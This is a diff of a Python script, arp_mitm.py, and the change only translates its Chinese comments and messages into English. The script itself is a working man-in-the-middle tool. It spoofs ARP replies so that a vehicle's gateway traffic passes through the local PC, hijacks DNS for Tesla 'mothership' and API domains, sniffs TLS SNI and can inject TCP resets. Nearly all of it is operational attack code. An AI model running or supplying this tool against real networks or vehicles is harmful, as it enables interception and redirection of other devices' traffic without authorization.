@@ -1,21 +1,21 @@
 #!/usr/bin/env python
 r"""
-arp_mitm.py — 把车机流量引到本机（纯用户态，不需要管理员）
+arp_mitm.py - Route vehicle traffic through the local PC in user space
 
-原理：
-  1. 每 1 秒给车机发 ARP 应答："192.168.199.1 的 MAC 是本机"
-     -> 车机所有上行流量（含 DNS）先到本机；
-  2. UDP/53：命中 redirect 域名就本地应答成 --answer，其余转发上游并回填；
-  3. 其余流量：在用户态做二层转发（改 dst MAC 为真实网关 MAC 再发出），
-     所以车机的普通上网不断，也不需要开 Windows 的 IP 转发（那要管理员）。
-     回程不经过本机：网关侧 ARP 没被改，F50 直接把回包发给车机。
-  4. 退出时把车机的网关 ARP 改回真实 MAC。
+Operation:
+  1. Send the vehicle an ARP reply once per second advertising this PC's MAC for 192.168.199.1.
+     The PC then receives outbound traffic from the vehicle, including DNS queries.
+  2. For UDP/53, answer matching DNS queries locally with --answer and relay other queries upstream.
+  3. Forward other traffic at layer 2 by setting the destination MAC to the actual gateway MAC.
+     This keeps normal vehicle connectivity available without enabling Windows IP forwarding.
+     The gateway's ARP state is unchanged, so it sends replies directly to the vehicle.
+  4. Restore the actual gateway MAC in the vehicle's ARP cache on exit.
 
-用法：
+Usage:
     python tools\arp_mitm.py --target 192.168.199.95 --gateway 192.168.199.1 \
         --answer 192.168.199.148 --iface Wi-Fi --duration 7200
 
-日志：C:\fsd-mitm\logs\arp_mitm.log；DNS 命中同时写入 logs\dns.jsonl（同 dns_sink schema）
+Logs: C:\fsd-mitm\logs\arp_mitm.log. Matching DNS queries also use the dns_sink schema in logs\dns.jsonl.
 """
 from __future__ import annotations
 
@@ -37,7 +37,7 @@ ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 LOG_PATH = os.path.join(ROOT, "logs", "arp_mitm.log")
 DNS_JSONL = os.path.join(ROOT, "logs", "dns.jsonl")
 REDIRECT = {"mothership.vn.teslamotors.com", "mothership.vn.cloud.tesla.cn", "api-prd.vn.cloud.tesla.cn"}
-REDIRECT_PREFIX = ("mothership.",)   # 任何 mothership.* 都劫持到本机
+REDIRECT_PREFIX = ("mothership.",)   # Resolve all mothership.* domains to the local PC.
 UPSTREAM = "223.5.5.5"
 
 LOG_LOCK = threading.Lock()
@@ -69,7 +69,7 @@ def log_dns(q: str, qtype: int, action: str, ip: str, peer: str) -> None:
 
 
 def tls_sni(payload: bytes) -> str | None:
-    """从 TCP 载荷里提取 TLS ClientHello 的 SNI（只读，不解密）。"""
+    """Extract the SNI from a TLS ClientHello in the TCP payload without decrypting it."""
     try:
         if len(payload) < 6 or payload[0] != 0x16:
             return None
@@ -100,7 +100,7 @@ def tls_sni(payload: bytes) -> str | None:
     return None
 
 def resolve_mac(ip: str, tries: int = 12) -> str | None:
-    """解析 MAC：先 ping 填 ARP 缓存，再轮询 getmacbyip，最后回退 arp -a。"""
+    """Resolve the MAC by warming the ARP cache, polling getmacbyip, and falling back to arp -a."""
     for _ in range(tries):
         mac = getmacbyip(ip)
         if mac:
@@ -165,9 +165,9 @@ class Mitm:
             except Exception:  # noqa: BLE001
                 pass
             time.sleep(0.3)
-        log(f"restore: 车机的 {self.gw_ip} 已改回真实 MAC {self.gw_mac}")
+        log(f"restore: restored the vehicle's ARP entry for {self.gw_ip} to {self.gw_mac}")
 
-    # ---------- 发送 ----------
+    # ---------- Sending ----------
     def _send_l3(self, pkt, payload: bytes, src_ip: str) -> None:
         sendp(Ether(src=self.our_mac, dst=self.target_mac) /
               IP(src=src_ip, dst=self.target_ip) /
@@ -203,7 +203,7 @@ class Mitm:
             stats["error"] += 1
             log(f"forward dns fail {qname}: {exc}")
 
-    # ---------- 二层转发 ----------
+    # ---------- Layer 2 forwarding ----------
     def _forward_l2(self, pkt) -> None:
         try:
             fwd = pkt.copy()
@@ -215,7 +215,7 @@ class Mitm:
             stats["error"] += 1
             log(f"l2 forward error: {type(exc).__name__}: {exc}")
 
-    # ---------- 主处理 ----------
+    # ---------- Packet handling ----------
     def handle(self, pkt) -> None:
         try:
             if IP not in pkt:
@@ -224,7 +224,7 @@ class Mitm:
             if ip.src != self.target_ip:
                 return
             if ip.dst == self.our_ip or ip.dst in self.extra_local:
-                stats["skipped"] += 1          # 打给本机的（4567 等）交给内核
+                stats["skipped"] += 1          # The kernel handles traffic destined for the PC, such as port 4567.
                 if TCP in pkt and (int(pkt[TCP].flags) & 0x02):   # SYN
                     key = f"oursyn:{pkt[TCP].dport}"
                     if key not in SEEN:
@@ -267,7 +267,7 @@ class Mitm:
                         SEEN.add(sni)
                         log(f"TLS ClientHello SNI={sni} -> {ip.dst}:{pkt[TCP].dport}")
                         if sni.startswith("mothership."):
-                            log(f"*** 命中目标域名 {sni}，随后应出现到本机 4567 的连接 ***")
+                            log(f"*** Matched {sni}. A connection to local port 4567 is expected. ***")
             if self.forward_l2:
                 self._forward_l2(pkt)
         except Exception as exc:  # noqa: BLE001
@@ -276,8 +276,8 @@ class Mitm:
 
     def run(self, duration: int) -> None:
         threading.Thread(target=self.poison_loop, daemon=True).start()
-        log(f"poison: {self.target_ip} 认为 {self.gw_ip} = {self.our_mac} "
-            f"(真实网关 {self.gw_mac}) | answer={self.answer_ip} | forward_l2={self.forward_l2}")
+        log(f"poison: {self.target_ip} sees {self.gw_ip} at {self.our_mac} "
+            f"(actual gateway {self.gw_mac}) | answer={self.answer_ip} | forward_l2={self.forward_l2}")
         flt = f"ether src {self.target_mac}"
         end = time.time() + duration if duration > 0 else None
         last_report = time.time()
@@ -305,20 +305,20 @@ def main() -> int:
     ap.add_argument("--answer", required=True)
     ap.add_argument("--duration", type=int, default=0)
     ap.add_argument("--no-forward", action="store_true")
-    ap.add_argument("--extra-local", default="", help="本机额外 IP（逗号分隔），这些目的地址不转发")
-    ap.add_argument("--rst-dst", default="", help="对这些目的 IP 直接发 RST 并丢弃（逗号分隔）")
-    ap.add_argument("--no-api", action="store_true", help="不劫持 api-prd（恢复车机 API 正常）")
+    ap.add_argument("--extra-local", default="", help="Comma-separated local destination IPs to exclude from forwarding")
+    ap.add_argument("--rst-dst", default="", help="Comma-separated destination IPs for which to send an RST and drop the packet")
+    ap.add_argument("--no-api", action="store_true", help="Keep normal vehicle API routing for api-prd")
     args = ap.parse_args()
 
     if args.no_api:
         REDIRECT.discard("api-prd.vn.cloud.tesla.cn")
-        log("--no-api: 不劫持 api-prd.vn.cloud.tesla.cn")
+        log("--no-api: skipping redirection for api-prd.vn.cloud.tesla.cn")
     iface = conf.ifaces.dev_from_name(args.iface).name
     our_mac = conf.ifaces.dev_from_name(args.iface).mac
     target_mac = resolve_mac(args.target)
     gw_mac = resolve_mac(args.gateway)
     if not target_mac or not gw_mac:
-        log(f"MAC 解析失败 target={target_mac} gateway={gw_mac}")
+        log(f"MAC resolution failed: target={target_mac} gateway={gw_mac}")
         return 2
     log(f"iface={iface} our={our_mac} target={args.target}/{target_mac} gateway={args.gateway}/{gw_mac}")
     Mitm(iface, args.target, target_mac, args.gateway, gw_mac, our_mac,
